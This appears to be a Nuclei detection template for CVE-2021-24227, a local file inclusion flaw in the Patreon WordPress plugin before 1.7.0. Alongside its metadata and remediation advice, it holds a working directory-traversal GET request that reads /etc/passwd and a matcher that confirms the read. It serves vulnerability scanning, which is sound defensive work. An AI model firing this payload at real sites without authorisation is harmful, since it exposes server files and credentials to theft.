id: CVE-2021-24227

info:
  name: Patreon WordPress  <1.7.0 - Unauthenticated Local File Inclusion
  author: theamanrawat
  severity: high
  description: Patreon WordPress before version 1.7.0 is vulnerable to unauthenticated local file inclusion that could be abused by anyone visiting the site. Exploitation by an attacker could leak important internal files like wp-config.php, which contains database credentials and cryptographic keys used in the generation of nonces and cookies.
  impact: |
    An attacker can exploit this vulnerability to read sensitive files on the server, potentially leading to further compromise of the system.
  remediation: |
    Upgrade to Patreon WordPress plugin version 1.7.0 or later to mitigate this vulnerability.
  reference:
    - https://wpscan.com/vulnerability/f62df02d-7678-440f-84a1-ddbf09364016
    - https://wordpress.org/plugins/patreon-connect/
    - https://jetpack.com/2021/03/26/vulnerabilities-found-in-patreon-wordpress-plugin/
    - https://nvd.nist.gov/vuln/detail/CVE-2021-24227
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-24227
    cwe-id: CWE-200
    epss-score: 0.02872
    epss-percentile: 0.89698
    cpe: cpe:2.3:a:patreon:patreon_wordpress:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 1
    vendor: patreon
    product: patreon_wordpress
    framework: wordpress
  tags: wordpress,patreon-connect,unauth,cve2021,lfi,patreon,wp,wpscan,cve

http:
  - method: GET
    path:
      - "{{BaseURL}}/?patron_only_image=../../../../../../../../../../etc/passwd&patreon_action=serve_patron_only_image"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100eeeae8ab0df73cf7b7ecf91459b7c5657b90cae36f823f1d942e0e3d5f9ac2b70221008687db44c5c1b80e8b2690351bd07b27edad02e7a3df959d7eb6d87a24e5413d:922c64590222798bb761d5b6d8e72950